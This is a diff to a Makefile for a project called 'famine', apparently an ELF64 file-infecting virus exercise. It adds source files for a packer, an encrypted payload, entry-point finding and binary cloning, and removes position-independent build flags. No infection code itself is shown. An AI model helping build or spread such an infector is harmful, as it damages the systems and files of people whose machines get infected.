@@ -15,11 +15,21 @@
 NAME = famine
 
 SRC =	main.c \
-	famine.c \
 	utils.c \
+	famine.c \
 	file_iterator.c \
 	infect/infect.c \
-	infect/endian.c
+	infect/endian.c \
+	infect/encrypt.s \
+	infect/decrypt.s \
+	infect/accessors.c \
+	infect/elf64_packer.c \
+	infect/elf64_payload.s \
+	infect/elf64_iterators.c \
+	infect/elf64_find_entry.c \
+	infect/elf64_setup_payload.c \
+	infect/elf64_copy_to_clone.c \
+	infect/elf64_adjust_refernces.c \
 
 CC = clang
 
@@ -34,11 +44,11 @@ OBJ = $(OBJC:.s=.o)
 
 DEP = $(addprefix ${OBJDIR}/, $(SRC:.c=.d))
 
-CFLAGS = -Wall -Wextra -MMD -fpie -g
+CFLAGS = -Wall -Wextra -MMD -g
 
 ASFLAGS = -f elf64 -g
 
-LDFLAGS = -Iincludes/ -pie
+LDFLAGS = -Iincludes/
 
 ############################## COLORS ##########################################
 
